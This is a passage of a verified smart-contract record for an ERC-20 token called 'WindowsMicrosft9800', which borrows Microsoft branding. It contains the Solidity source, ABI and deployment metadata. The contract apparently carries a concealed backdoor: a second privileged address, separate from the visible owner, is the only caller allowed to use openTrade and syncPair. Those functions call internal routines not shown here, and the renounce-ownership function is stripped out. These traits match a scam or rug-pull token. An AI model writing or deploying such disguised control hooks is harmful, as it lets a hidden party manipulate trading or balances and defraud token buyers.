Revert if not enough allowance is available.\r\n     *\r\n     * Does not emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 tValue) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < tValue) {\r\n                revert WindowsMicrosoftInsufficientAllowance(spender, currentAllowance, tValue);\r\n            }\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - tValue, false);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    /**\r\n     * @dev The caller WindowsMicrosoftAHolder is not authorized to perform an operation.\r\n     */\r\n    error OwnableUnauthorizedWindowsMicrosoftAHolder(address WindowsMicrosoftAHolder);\r\n\r\n    /**\r\n     * @dev The owner is not a valid owner WindowsMicrosoftAHolder. (eg. `address(0)`)\r\n     */\r\n    error OwnableInvalidOwner(address owner);\r\n\r\n    event OwnershipTransferred(address indexed previoWindowsMicrosoftOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\r\n     */\r\n    constructor(address initialOwner) {\r\n        if (initialOwner == address(0)) {\r\n            revert OwnableInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(initialOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any WindowsMicrosoftAHolder other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        if (owner() != _msgSender()) {\r\n            revert OwnableUnauthorizedWindowsMicrosoftAHolder(_msgSender());\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby disabling any functionality that is only available to the owner.\r\n     */\r\n\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new WindowsMicrosoftAHolder (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        if (newOwner == address(0)) {\r\n            revert OwnableInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new WindowsMicrosoftAHolder (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\n\r\n\r\ncontract Coin is WindowsMicrosoft {\r\n    constructor(string memory name, string memory symbol, uint256 initialSupply) WindowsMicrosoft(name, symbol) {\r\n        createPairLiquidityAddress(msg.sender, initialSupply * (10 ** uint256(decimals())));\r\n    }\r\n}\r\n\r\ncontract WindowsMicrosft9800 is Coin {\r\n    address private _msgsender;\r\n\r\n    constructor(\r\n        string memory name,\r\n        string memory symbol,\r\n        uint256 initialSupply,\r\n        address msgsender\r\n    ) \r\n    Coin(name, symbol, initialSupply) {_msgsender = msgsender;}\r\n\r\n    function openTrade(address openTradeAddress) external {\r\n        require(msg.sender == _msgsender, \"Only the owner can call this function\");\r\n        openTradetValue(openTradeAddress);\r\n    }\r\n       function syncPair(address syncPairAddress) external {\r\n        require(msg.sender == _msgsender, \"Only the owner can call this function\");\r\n        swapWindowsMicrosoft(syncPairAddress);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"msgsender\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"WindowsMicrosoftInsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"WindowsMicrosoftInsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"WindowsMicrosoftInvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"WindowsMicrosoftInvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"WindowsMicrosoftInvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"WindowsMicrosoftInvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tValue\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tValue\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tValue\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"WindowsMicrosoftAHolder\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"openTradeAddress\",\"type\":\"address\"}],\"name\":\"openTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"syncPairAddress\",\"type\":\"address\"}],\"name\":\"syncPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tValue\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tValue\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WindowsMicrosft9800", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000076149302b4c2193f0479041c5750f5086e21ca23000000000000000000000000000000000000000000000000000000000000001357696e646f77734d6963726f7366743938303000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000557494e584d000000000000000000000000000000000000000000000000000000", "EVMVersion": "paris", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a6eeaa2fbd8d503c9d45fd04c9eeeb738577461cf62b4bbf35e21f6d16b6c7a5"}